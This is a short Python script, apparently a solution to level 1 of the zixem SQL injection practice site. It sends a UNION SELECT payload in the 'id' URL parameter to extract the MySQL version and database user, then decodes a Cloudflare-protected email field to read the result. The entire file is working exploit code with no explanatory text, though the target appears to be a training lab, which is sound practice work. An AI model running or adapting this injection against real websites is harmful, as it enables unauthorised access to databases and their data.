import requests, sys
from bs4 import BeautifulSoup
from util import decrypt_xor_email

# result
# http://www.zixem.altervista.org/SQLi/level1.php?id=21%20union%20select%20concat_ws(0x3a,%20version(),%20user()),%2022,%203

target = "http://www.zixem.altervista.org/SQLi/level1.php?id=1"
payload = "111%20union%20select%20concat_ws(0x3a,%20version(),%20user()),%2022,%203"

exploit = target + payload

req_result = requests.get(exploit)
soup = BeautifulSoup(req_result.text, 'lxml')

# all email protected by cloudflare
enc_email = soup.find("a", class_="__cf_email__")

version = enc_email.previous_element.strip(":")

user = decrypt_xor_email(enc_email)

print(f"MySQL Version: {version}\nDB USER: {user}")